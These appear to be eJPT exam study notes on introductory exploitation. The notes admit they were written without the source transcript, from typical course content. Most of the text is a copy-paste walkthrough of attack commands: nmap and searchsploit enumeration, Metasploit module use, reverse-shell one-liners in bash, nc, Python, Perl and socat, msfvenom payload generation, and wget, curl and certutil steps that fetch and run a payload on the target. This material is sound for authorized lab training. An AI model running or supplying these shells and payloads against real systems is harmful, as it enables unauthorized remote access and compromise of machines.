# 01 - Introduction To Exploitation — eJPT Study Notes

Note: No transcript was provided. The following is a conservative, exam-focused summary based on typical “Introduction to Exploitation” content in eJPT learning paths.

## What the video covers (Introduction / big picture)
- Where exploitation fits in the penetration testing lifecycle: from enumeration to gaining initial access.
- Translating service/version info into exploit candidates (CVE lookup, public PoCs).
- Choosing between framework-driven (Metasploit) and manual exploitation.
- Payload fundamentals: reverse vs bind shells, staged vs stageless, and common payload delivery.
- Initial foothold hygiene: stabilize shell, verify access, minimal post-exploitation triage.
- Safety and scope-aware exploitation (avoid DoS, pick reliable exploits).

## Flow (ordered)
1. Confirm scope/targets and network access (VPN/tun interface).
2. Service enumeration (identify open ports and versions).
3. Map versions/config to vulnerabilities (CVE, Exploit-DB).
4. Select exploit path: public PoC/manual vs Metasploit module.
5. Prepare payload and listener (reverse shell preferred in lab/VPN).
6. Execute exploit and obtain shell/session.
7. Stabilize the shell (TTY upgrade), verify access.
8. Minimal post-exploitation checks (whoami/sysinfo, network, proof).
9. Document steps and evidence; avoid destructive actions.

## Tools highlighted
- Nmap (service/version detection, vuln scripts)
- searchsploit (Exploit-DB CLI), Exploit-DB web
- Metasploit Framework: msfconsole, modules, multi/handler
- msfvenom (payload generation)
- netcat/ncat, rlwrap (listeners), socat (stable TTY)
- curl/wget (file transfer on Linux)
- Python’s simple HTTP server (file hosting)
- Windows transfer helpers: certutil, PowerShell Invoke-WebRequest

## Typical command walkthrough (detailed, copy-paste friendly)

### 0) Quick environment prep
```bash
# Identify your VPN/LHOST (adjust interface if needed)
ip -4 addr show tun0
# Optional: export for reuse
export LHOST=$(ip -4 addr show tun0 | awk '/inet/{print $2}' | cut -d/ -f1)
echo $LHOST
```

### 1) Enumerate services, versions, and basic vulns
```bash
# All-ports TCP sweep
nmap -p- --min-rate 5000 -oA scans/full_tcp <TARGET>

# Targeted scripts and versions on found ports
nmap -sC -sV -p <OPEN_PORTS_CSV> -oA scans/versions <TARGET>

# Basic vulnerability sweep (non-intrusive where possible)
nmap --script vuln -p <OPEN_PORTS_CSV> -oA scans/vuln <TARGET>
```

### 2) Identify exploit candidates
```bash
# Search Exploit-DB by service/version strings spotted in nmap
searchsploit <product> <version>
searchsploit <cve-id>     # If you already have a CVE

# Get URLs/paths and mirror PoCs for local review
searchsploit -w <product>
searchsploit -m <exploit_id_or_path>   # Copies PoC to current directory
```

### 3) Framework-driven exploitation (Metasploit example)
```bash
msfconsole -q

# Find module
search <product> <version>    # Or: search cve:<YEAR-XXXX>

# Pick module (example)
use exploit/<path/to/module>
show options

# Configure target and payload
set RHOSTS <TARGET>
set RPORT <PORT>
set LHOST $LHOST
# Choose payload (examples)
set PAYLOAD linux/x64/shell_reverse_tcp
# or:
# set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
run
# or:
exploit

# If meterpreter:
# sysinfo
# getuid
# shell
```

### 4) Manual reverse shell path (when you have RCE)
```bash
# Listener (wrap for history/arrow keys)
rlwrap nc -lvnp 4444

# Trigger a reverse shell from the target (examples):

# Bash
bash -c 'bash -i >& /dev/tcp/'"$LHOST"'/4444 0>&1'

# POSIX sh with mkfifo (works widely)
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc '"$LHOST"' 4444 > /tmp/f

# Python
python3 -c 'import os,pty,socket; s=socket.socket(); s.connect(("'"$LHOST"'",4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/bash")'

# Perl
perl -e 'use Socket;$i="'"$LHOST"'";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 5) TTY upgrade (Linux)
```bash
# In the reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background and fix local TTY:
# Press: Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
stty rows 50 columns 120
```

socat method (if available for a fully interactive TTY):
```bash
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target
socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
```

### 6) Payload generation and handling (msfvenom + handler)
```bash
# Linux ELF reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o rev.elf

# Windows EXE reverse shell (stageless)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o rev.exe

# Meterpreter (example)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o met_rev.exe

# Handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST $LHOST; set LPORT 4444; run"
```

### 7) File transfer
```bash
# Host files (attacker)
python3 -m http.server 8000

# Linux target (pull)
wget http://$LHOST:8000/rev.elf -O /tmp/rev.elf
curl -o /tmp/rev.elf http://$LHOST:8000/rev.elf
chmod +x /tmp/rev.elf; /tmp/rev.elf

# Windows target (pull)
certutil -urlcache -f http://%LHOST%:8000/rev.exe C:\Windows\Temp\rev.exe
powershell -Command "Invoke-WebRequest -Uri http://$env:LHOST:8000/rev.exe -OutFile C:\Windows\Temp\rev.exe"
```

### 8) Minimal post-exploitation verification
```bash
# Linux
whoami; id; hostname; uname -a; ip a

# Windows (cmd)
whoami & hostname & systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig /all
```

## Practical tips
- Prefer reverse shells in VPN labs; choose a reachable LPORT (unfiltered outbound).
- Stageless payloads (…/shell_reverse_tcp) are simpler and more reliable through some middleboxes than staged (…/meterpreter/reverse_tcp).
- Match architecture and OS (x86 vs x64, Linux vs Windows) to reduce crashes.
- Read PoCs before running. Many require edits (target offsets, paths, creds).
- Start with low-impact exploits; avoid known-DoS modules in shared labs.
- Validate service versions carefully; minor version mismatch can break some exploits.
- If Metasploit fails, try manual PoC (and vice versa).
- Always stabilize shells early; unstable TTYs waste time.
- Document exact commands that worked and evidence (screenshots/notes).

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Discover and identify versions
nmap -p- --min-rate 5000 -oA scans/full_tcp <TARGET>
nmap -sC -sV -p <OPEN_PORTS_CSV> -oA scans/versions <TARGET>

# 2) Map to exploits
searchsploit <product> <version>
searchsploit -m <exploit_id_or_path>

# 3) Prepare listener (reverse shell)
export LHOST=$(ip -4 addr show tun0 | awk '/inet/{print $2}' | cut -d/ -f1)
rlwrap nc -lvnp 4444

# 4) Trigger RCE -> reverse shell (example)
bash -c 'bash -i >& /dev/tcp/'"$LHOST"'/4444 0>&1'

# 5) TTY fix
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset; export TERM=xterm

# 6) Metasploit (if using a module)
msfconsole -q
search <product> <version>
use exploit/<path>; set RHOSTS <TARGET>; set RPORT <PORT>; set LHOST $LHOST; set PAYLOAD linux/x64/shell_reverse_tcp; run

# 7) Payload gen (optional)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o rev.elf
python3 -m http.server 8000
wget http://$LHOST:8000/rev.elf -O /tmp/rev.elf; chmod +x /tmp/rev.elf; /tmp/rev.elf
```

## Summary
This introduction positions exploitation as the bridge between solid enumeration and initial access. You translate discovered services and versions into exploit options, pick reliable paths (framework or manual), choose appropriate payloads (typically reverse/stageless), and execute with care. After landing a foothold, stabilize the shell and verify access, then proceed methodically. In eJPT-style labs, sticking to well-understood, low-risk public exploits, clean listeners, and disciplined documentation yields consistent results.